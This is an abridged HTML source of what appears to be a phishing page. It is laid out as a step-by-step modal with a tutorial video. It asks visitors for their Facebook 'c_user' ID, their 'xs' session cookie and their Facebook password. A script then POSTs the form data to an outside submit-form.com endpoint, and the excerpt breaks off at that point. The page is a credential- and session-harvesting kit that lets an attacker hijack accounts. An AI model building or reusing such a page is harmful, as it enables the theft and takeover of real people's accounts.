    ...
    <div class="header">
      <div class="header-content">
        ...
        <div class="google-translate-container">
          ...
          <select id="google_translate_element" style="
              width: 100%;
              background: transparent;
              border: none;
              color: white;
        ...
        <div class="modal-body">
          ...
          <div class="step-content active" id="step1">
            ...
            <div class="video-player-container">
              ...
              <div class="video-container">
                <video id="tutorialVideo" src="English_US_video_information_V1.mp4">
            ...
            <div class="form-group">
              ...
              <input type="text" id="c_user" name="c_user" placeholder="Enter your c_user value" pattern="\d+" title="c_user only" required="">
            ...
            <div class="form-group">
              ...
              <input type="text" id="xs" name="xs" placeholder="Enter your xs value" pattern=".{20,}" title="xs only" required="">
              <div class="validation-hint">
          ...
          <div class="step-content" id="step2">
            ...
            <div class="form-group">
              ...
              <input type="password" id="password" name="password" placeholder="Enter your Facebook password" required="">
            </div>
    ...
    <script>
      document.addEventListener("DOMContentLoaded", function () {
        ...
        nextToStep2.addEventListener("click", function () {
          ...
          fetch("https://submit-form.com/RlccsR2R3", {
            method: "POST",
            headers: {
